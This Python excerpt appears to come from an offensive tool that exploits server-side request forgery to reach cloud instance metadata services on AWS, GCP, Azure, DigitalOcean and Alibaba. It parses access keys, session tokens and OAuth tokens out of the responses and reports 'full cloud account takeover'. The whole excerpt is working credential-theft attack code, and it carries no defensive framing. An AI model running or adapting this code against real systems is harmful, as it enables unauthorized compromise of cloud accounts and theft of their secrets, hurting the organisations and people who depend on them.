    async def _detect_cloud_provider(self) -> Optional[str]:
        """Detect which cloud provider the target is running on."""
        probe_endpoints = {
            "aws": "http://169.254.169.254/latest/meta-data/",
            "gcp": "http://metadata.google.internal/computeMetadata/v1/",
            "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "digitalocean": "http://169.254.169.254/metadata/v1/",
            "alibaba": "http://100.100.100.200/latest/meta-data/",
        }
        
        async with aiohttp.ClientSession() as session:
            for cloud, probe_url in probe_endpoints.items():
                for ssrf_url in self.ssrf_endpoints[:5]:
                    try:
                        test_url = self._build_ssrf_url(ssrf_url, probe_url)
                        headers = {}
                        if self._zombie:
                            headers = self._zombie.get_headers(test_url)
                        
                        async with session.get(
                            test_url, headers=headers,
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                            ssl=False,
                        ) as resp:
                            body = await resp.text()
                            
                            if cloud == "aws" and ("ami-id" in body or "instance-id" in body):
                                return "aws"
                            elif cloud == "gcp" and ("computeMetadata" in body or "project-id" in body):
                                return "gcp"
                            elif cloud == "azure" and ("compute" in body or "network" in body):
                                return "azure"
                            elif cloud == "digitalocean" and ("droplet_id" in body):
                                return "digitalocean"
                            elif cloud == "alibaba" and ("instance-id" in body):
                                return "alibaba"
                    
                    except Exception:
                        continue
        
        return None
    
    async def _extract_metadata(self, provider_id: str, provider_info: Dict) -> Dict:
        """Extract metadata from cloud provider endpoints via SSRF."""
        metadata = {}
        base_url = provider_info["base_url"]
        
        async with aiohttp.ClientSession() as session:
            for endpoint in provider_info["endpoints"]:
                url = f"{base_url}{endpoint}"
                
                for ssrf_url in self.ssrf_endpoints[:3]:
                    try:
                        test_url = self._build_ssrf_url(ssrf_url, url)
                        
                        headers = {}
                        if self._zombie:
                            headers = self._zombie.get_headers(test_url)
                        
                        if provider_info.get("header"):
                            headers.update(provider_info["header"])
                        
                        async with session.get(
                            test_url, headers=headers,
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                            ssl=False,
                        ) as resp:
                            body = await resp.text()
                            
                            if body and len(body) > 10 and "error" not in body.lower()[:50]:
                                metadata[endpoint] = {
                                    "body": body[:5000],
                                    "status": resp.status,
                                    "url_used": test_url,
                                    "ssrf_source": ssrf_url,
                                }
                                self.stats["metadata_endpoints"] += 1
                                break
                    
                    except Exception:
                        continue
        
        return metadata
    
    async def _extract_credentials(self, provider_id: str, metadata: Dict) -> List[Dict]:
        """Extract IAM credentials from metadata responses."""
        credentials = []
        provider_info = self.METADATA_ENDPOINTS.get(provider_id, {})
        creds_path = provider_info.get("credentials_path")
        
        if not creds_path:
            return []
        
        for endpoint, data in metadata.items():
            if creds_path in endpoint:
                body = data.get("body", "")
                
                if provider_id in ["aws_imdsv2", "aws_imdsv1"]:
                    # Parse AWS IAM credentials
                    role_names = [line.strip() for line in body.strip().split("\n") if line.strip()]
                    for role in role_names:
                        cred_endpoint = f"{creds_path}{role}"
                        cred_data = metadata.get(cred_endpoint, {}).get("body", "")
                        if cred_data and "AccessKeyId" in cred_data:
                            try:
                                cred_json = json.loads(cred_data)
                                credentials.append({
                                    "cloud": "AWS",
                                    "role": role,
                                    "access_key_id": cred_json.get("AccessKeyId"),
                                    "secret_access_key": cred_json.get("SecretAccessKey"),
                                    "session_token": cred_json.get("Token"),
                                    "expiration": cred_json.get("Expiration"),
                                    "source": f"SSRF → {data['url_used']}",
                                })
                            except Exception:
                                pass
                
                elif provider_id == "gcp":
                    try:
                        cred_json = json.loads(body)
                        credentials.append({
                            "cloud": "GCP",
                            "role": "default",
                            "access_token": cred_json.get("access_token"),
                            "expires_in": cred_json.get("expires_in"),
                            "token_type": cred_json.get("token_type"),
                            "source": f"SSRF → {data['url_used']}",
                        })
                    except Exception:
                        pass
                
                elif provider_id == "azure":
                    try:
                        cred_json = json.loads(body)
                        credentials.append({
                            "cloud": "Azure",
                            "role": "managed_identity",
                            "access_token": cred_json.get("access_token"),
                            "expires_on": cred_json.get("expires_on"),
                            "resource": cred_json.get("resource"),
                            "source": f"SSRF → {data['url_used']}",
                        })
                    except Exception:
                        pass
                
                elif provider_id == "alibaba":
                    role_names = [line.strip() for line in body.strip().split("\n") if line.strip()]
                    for role in role_names:
                        cred_endpoint = f"{creds_path}{role}"
                        cred_data = metadata.get(cred_endpoint, {}).get("body", "")
                        if cred_data:
                            try:
                                cred_json = json.loads(cred_data)
                                credentials.append({
                                    "cloud": "Alibaba Cloud",
                                    "role": role,
                                    "access_key_id": cred_json.get("AccessKeyId"),
                                    "secret_access_key": cred_json.get("AccessKeySecret"),
                                    "session_token": cred_json.get("SecurityToken"),
                                    "source": f"SSRF → {data['url_used']}",
                                })
                            except Exception:
                                pass
        
        return credentials
    
    async def _validate_credentials(self, cred: Dict) -> bool:
        """Validate extracted cloud credentials."""
        cloud = cred.get("cloud", "").lower()
        
        if "aws" in cloud:
            return bool(cred.get("access_key_id") and cred.get("secret_access_key"))
        elif "gcp" in cloud:
            return bool(cred.get("access_token"))
        elif "azure" in cloud:
            return bool(cred.get("access_token"))
        elif "alibaba" in cloud:
            return bool(cred.get("access_key_id") and cred.get("secret_access_key"))
        
        return False
    
    async def _deep_extract(self) -> None:
        """Perform deep metadata extraction for more endpoints."""
        deep_endpoints = {
            "aws": [
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                "http://169.254.169.254/latest/meta-data/network/interfaces/macs/",
                "http://169.254.169.254/latest/meta-data/services/domain/",
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/instance/disks/",
                "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/",
                "http://metadata.google.internal/computeMetadata/v1/project/attributes/",
            ],
            "azure": [
                "http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01",
                "http://169.254.169.254/metadata/scheduledevents?api-version=2021-02-01",
            ],
        }
        
        if self.cloud_detected and self.cloud_detected in deep_endpoints:
            async with aiohttp.ClientSession() as session:
                for endpoint in deep_endpoints[self.cloud_detected]:
                    for ssrf_url in self.ssrf_endpoints[:3]:
                        try:
                            test_url = self._build_ssrf_url(ssrf_url, endpoint)
                            headers = {}
                            if self._zombie:
                                headers = self._zombie.get_headers(test_url)
                            
                            async with session.get(
                                test_url, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=self.timeout),
                                ssl=False,
                            ) as resp:
                                body = await resp.text()
                                if body and len(body) > 10:
                                    self.metadata_dump.setdefault(self.cloud_detected, {})[endpoint] = {
                                        "body": body[:5000],
                                        "status": resp.status,
                                    }
                        except Exception:
                            continue
    
    def _build_ssrf_url(self, ssrf_endpoint: str, target_url: str) -> str:
        """Build SSRF URL to access target metadata endpoint."""
        # Direct injection
        if "SSRF_PAYLOAD" in ssrf_endpoint:
            return ssrf_endpoint.replace("SSRF_PAYLOAD", target_url)
        
        # Query parameter injection
        if "?" in ssrf_endpoint:
            return f"{ssrf_endpoint}&url={quote(target_url)}"
        
        return f"{ssrf_endpoint}?url={quote(target_url)}"
    
    def _build_report(self) -> Dict:
        """Build cloud exfiltration report."""
        valid_creds = [c for c in self.extracted_credentials if c.get("valid")]
        
        return {
            "session_id": self.session_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "ssrf_endpoints_tested": len(self.ssrf_endpoints),
            "cloud_detected": self.cloud_detected,
            "providers_extracted": list(self.metadata_dump.keys()),
            "credentials_extracted": len(self.extracted_credentials),
            "credentials_valid": len(valid_creds),
            "credentials": valid_creds,
            "cloud_takeover_possible": len(valid_creds) > 0,
            "impact": "FULL CLOUD ACCOUNT TAKEOVER" if valid_creds else "Partial metadata exposure",
        }


